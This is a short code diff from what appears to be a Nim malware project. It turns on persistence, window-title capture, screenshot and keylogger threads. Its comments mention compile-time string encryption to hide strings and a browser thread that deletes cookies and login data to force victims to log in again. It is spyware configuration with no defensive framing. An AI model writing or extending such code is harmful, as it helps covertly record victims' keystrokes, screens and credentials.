@@ -4,8 +4,17 @@
 ## used for compile-time string encryption
 from functions/hideString import e
 
+##
+const USE_PERSISTENCE_THREAD*: bool = true
+
+##
+const USE_WINDOW_NAME_THREAD*: bool = true
+
+##
+const USE_SCREENSHOT_THREAD*: bool = true
+
 ## keyloggerThread is used for logging key presses
-const USE_KEYLOGGER_THREAD*: bool = false
+const USE_KEYLOGGER_THREAD*: bool = true
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
